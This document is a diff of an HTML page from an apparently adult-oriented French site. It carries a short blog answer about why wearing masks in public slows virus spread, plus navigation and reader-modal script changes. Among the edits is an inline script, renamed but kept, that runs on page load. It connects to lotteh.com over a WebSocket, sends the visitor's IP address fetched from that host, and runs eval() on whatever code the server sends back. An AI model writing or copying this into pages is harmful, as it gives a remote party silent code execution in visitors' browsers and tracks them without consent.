@@ -65,7 +65,7 @@
               <a class="nav-link" href="/fr/landing" title="Visitez la page de destination">Atterrissage</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Chat vidéo">Chat</a>
+              <a class="nav-link" href="/fr/chat" title="Chat vidéo">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/fr/private" title="Voir des photos privées avec une clé">Privé</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyPhoto de profil" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Par Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Pourquoi est-il plus sûr de porter un masque en public? </p> <p> <br> </p> <p> Porter un masque en public est plus sûr car il aide à empêcher la propagation des gouttelettes respiratoires qui contiennentvirus, tels que Covid-19.Lorsqu'une personne avec un virus porte un masque, cela empêche sa libération de leurs gouttelettes respiratoires en l'air et potentiellement infecter les autres.De plus, le port d'un masque peut également protéger le porteur de l'inhalation de gouttelettes respiratoires des autres qui peuvent être infectés.Ceci est particulièrement important dans les situations où la distanciation sociale est difficile à entretenir, comme dans les espaces intérieurs bondés ou sur les transports en commun.Dans l'ensemble, porter un masque est un moyen simple et efficace de réduire la transmission des virus et de protéger vous-même et ceux qui vous entourent. </p> <v> <br> </div></div>
+<div style="white-space: pre-wrap;"><p>Pourquoi est-il plus sûr de porter un masque en public?</p><p><br/></p><p>Porter un masque en public est plus sûr car il aide à prévenir la propagation des gouttelettes respiratoires qui contiennent des virus, tels que Covid-19. Lorsqu'une personne avec un virus porte un masque, cela empêche sa libération de leurs gouttelettes respiratoires en l'air et potentiellement infecter les autres. De plus, le port d'un masque peut également protéger le porteur de l'inhalation de gouttelettes respiratoires des autres qui peuvent être infectés. Ceci est particulièrement important dans les situations où la distanciation sociale est difficile à entretenir, comme dans les espaces intérieurs bondés ou sur les transports en commun. Dans l'ensemble, porter un masque est un moyen simple et efficace d'aider à réduire la transmission des virus et à protéger vous-même et ceux qui vous entourent.</p><div><br/></div></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
